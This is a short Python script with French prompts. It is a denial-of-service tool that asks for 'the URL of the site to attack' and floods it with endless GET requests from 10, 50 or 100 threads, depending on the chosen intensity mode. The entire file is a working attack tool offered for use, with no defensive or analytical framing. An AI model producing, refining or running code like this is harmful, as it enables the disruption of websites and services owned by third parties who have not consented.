import requests
import threading
import time

def ddos(url, mode):
    if mode == "gentil":
        threads = 10
        delay = 1
    elif mode == "moyen":
        threads = 50
        delay = 0.5
    elif mode == "aggressif":
        threads = 100
        delay = 0.1
    else:
        print("Mode de DDoS non reconnu")
        return

    def attaque():
        while True:
            try:
                requests.get(url)
                time.sleep(delay)
            except requests.exceptions.RequestException as e:
                print(f"Erreur : {e}")

    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=attaque)
        t.start()
        threads_list.append(t)

    for t in threads_list:
        t.join()

def main():
    url = input("Entrez l'URL du site à attaquer : ")
    mode = input("Entrez le mode de DDoS (gentil, moyen, aggressif) : ")
    ddos(url, mode)

if __name__ == "__main__":
    main()